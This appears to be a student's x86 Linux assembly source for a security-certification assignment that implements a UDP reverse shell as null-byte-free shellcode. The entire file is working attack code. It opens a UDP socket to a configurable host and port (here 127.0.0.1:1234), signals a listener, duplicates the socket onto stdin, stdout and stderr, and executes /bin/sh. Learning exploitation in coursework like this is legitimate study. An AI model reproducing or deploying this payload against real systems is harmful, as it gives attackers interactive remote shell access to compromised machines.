; SLAE-X 
; thanks to writesup from previou students
; syscall available here /usr/include/linux/net.h
; assignment : 2. create a reverse shell  
; originality : using UDP instead TCP 

%define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
%define _port 1234              ; port  
PORT equ htons(_port)           ; 
_ip equ 0x0100007F		; loopback - 127.0.0.1

BUFLEN equ 1024; will read only 1024 bytes from UDP =) 

global _start 

_start: 


; again we create socket fd, using syscall 0x66 and argument SYS_SOCKET so ebx = 1  
push   0x66 
pop    eax    
push   0x1  
pop    ebx
xor    ecx,ecx
push   ecx
; but this times it will be a SOCK_DGRAM UDP, so 0x2 as argument 
push   0x2  
push   0x2 
mov    ecx,esp
int    0x80

; then we call connect on this UDP socket  
; we push ip address 
push   _ip
; we push port 
push word PORT
xor    cx,cx
add   cl,0x2
push   cx
mov    ecx,esp
push   0x10
push   ecx
push   eax
mov    ecx,esp
; we save fd received by socket creation which was still in eax  
mov    esi,eax
mov    al,0x66  
add    bl,0x2   
int    0x80


; now we send a UDP packet to open firewall   
mov eax,0x66 
; the send function is ssize_t send(int sockfd, const void *buf, size_t len, int flags);
; we will send "udpready" string to let the distant server know the shellcode is working  
push 0x0a3a7964 
push 0x72706475  
mov edx,esp
; no flags 
push 0x0 
; size is 8 
push 0x8 
push edx 
push esi 
mov ecx,esp 
mov ebx,0x9 
int 0x80 

; need to loop here ? 
; wait for UDP packet to be processed 
mov eax,0x66 
mov ebx,0xa
; recv socket 
int 0x80 


; duplicating fd from socket to stdin stdout stderr of the process 
mov    ebx,esi
; we need to clean ecx, at this stage it contains data "0xBFFFF39C"
; since we use "mov cl" and not mov ecx (to avoid null byte) we dont want to have this remaining data and break our loop 
xor ecx,ecx
mov    cl,0x2
; we use a loop and decrease cl register, ie from 2 to 0 , 2 - 1 - 0 
loop: 
; syscall dup2 
mov    al,0x3f
int    0x80
dec    ecx
; sign flag is not set if ecx is not inferior to 0 
; so we use "jump if not sign" which check if the flag is on   
jns    loop 

; syscall "execve", with arguments /bin/sh null terminated and a null string for envp argument  
mov    al,0xb
xor esi,esi
push   esi 
push   0x68732f2f ; 
push   0x6e69622f ; 
mov    ebx,esp
; push null termination 
xor esi,esi
push   esi 
mov    edx,esp
push   ebx
mov    ecx,esp
int    0x80


; exit cleanly 
; clean up eax 
xor eax,eax 
; avoid null byte  
mov    al,0x1
; move 0 into ebx without null byte 
xor esi,esi 
mov    ebx,esi 
int    0x80

